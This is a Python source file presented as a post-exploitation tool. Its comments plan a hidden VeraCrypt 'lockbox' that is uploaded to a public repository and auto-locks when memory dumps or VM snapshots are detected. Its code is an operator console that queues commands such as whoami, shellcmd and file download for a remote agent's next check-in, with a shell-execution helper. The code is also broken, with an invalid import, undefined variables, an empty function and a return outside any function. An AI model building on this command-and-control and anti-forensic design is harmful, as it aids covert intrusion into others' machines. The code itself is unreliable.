#!/usr/bin/env python3 

import argparse
import requests
from requests.structures import CaseInsensitiveDict
import subprocess
from subprocess import output
import time
import sys
from datetime import datetime

## Note: Post-exploitation tool

## Create lockbox
def create_burner_lockbox():
    
## If veracrypt is not installed:
##     Install veracrypt
##     Create lockbox
## else:
##    Create lockbox

## Stash the lockbox (optional)

## Upload the lockbox to a public repo

## Create short download URL : https://zapier.com/blog/best-url-shorteners/

## Download lockbox
## If veracrypt is not installed:
##     Install veracrypt
##     Download lockbox
## else:
##    Downalod lockbox

## Lockbox timer or auto-lock on exit or independent auto-lock memory resident code

## Detect memory dump routine and trigger auto-lock

## Detect vm snapshot routine and trigger auto-lock    

## Generate PE install package for Windows install package windows

## Generate DMG install package for Mac

## Generate RPM install package for CentOS/Redhat
## Generate Deb install package for Ubuntu/Debian 

def run_shell_command(cmd):
    try:
        pro = subprocess.run(cmd, capture_output=True, text=True, shell=True)#, shell=True,env=myenv,executable='/bin/bash')#
        if pro.stdout:
            output = pro.stdout
            
            return f"---------------Exploit/Shellcode Detail---------------\n {pro.stdout}"
        elif pro.stderr:
            return f"---------------Error----------------------------------\n {pro.stderr}"
        else:
            return f"[executed]"
    except Exception as ex:
        print("exception occurred", ex)
        return f"   [subprocess broke]"
        

if __name__ == '__main__':
    global command
    ## Create help and menu
    print("-----------------------------------------------------------------------------------------------------------")
    while True:
            command = input("Type in your command: %s]>>> " % str(peername))
            if 'help' in command:
                print("-"*100)
                print("++++++++++++++++++++++Help Menu+++++++++++++++++++++++++++++++")
                print(" ")
                print("+++Simple Commands (commands without arguements)++++")
                print(" 01: pwd: Print current directory")
                print(" 02: ls: List directory contents")
                print(" 03: ifconfig: Show IP Address and Mac Addrress")
                print(" 04: whoami: Check current logged on user")
                print(" 05: shutdown: Shutdown client")
                print(" 06: killagentcmd: Kill client agent")
                print(" ")
                print("+++Complex Commands(command with arguements)+++")
                print(" 07: downloadcmd: Example => downloadcmd file.txt")
                print(" 08: shellcmd: Example => shellcmd, ls -alh")
                print(" 09: submit: submit entered commands")
                print(" 10: help: Display help menu")
                print("-"*100)
                print(" ")
            elif (('pwd' in command) and ('shell' not in command)):
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[1m%s queued for execution on the endpoint at next checkin\033[0m" % command)
                
            elif (('ls' in command )and ('shell' not in command)):
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[1m%s queued for execution on the endpoint at next checkin\033[0m" % command)
                
            elif 'ifconfig' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[1m%s queued for execution on the endpoint at next checkin\033[0m" % command)
                
            elif 'whoami' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[1m%s queued for execution on the endpoint at next checkin\033[0m" % command)
                
            elif 'shutdown' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[1m%s queued for execution on the endpoint at next checkin\033[0m" % command)
                
            elif 'killagentcmd' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[1m%s queued for execution on the endpoint at next checkin\033[0m" % command)
                
            elif 'downloadcmd' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[1m%s queued for execution on the endpoint at next checkin\033[0m" % command)
                
            elif 'shellcmd' in command:
                cmdcounter = cmdcounter + 1
                cmds["'%s'"%str(cmdcounter)] = command
                print("\033[1m%s queued for execution on the endpoint at next checkin\033[0m" % command)
                
            elif command == 'submit':
                datalist = list(cmds.values())
                return web.json_response(datalist)
                break
                
            else:
                print("[-] Command not found")

    print("----------------------------------------------------------------------------------------------------------")
    

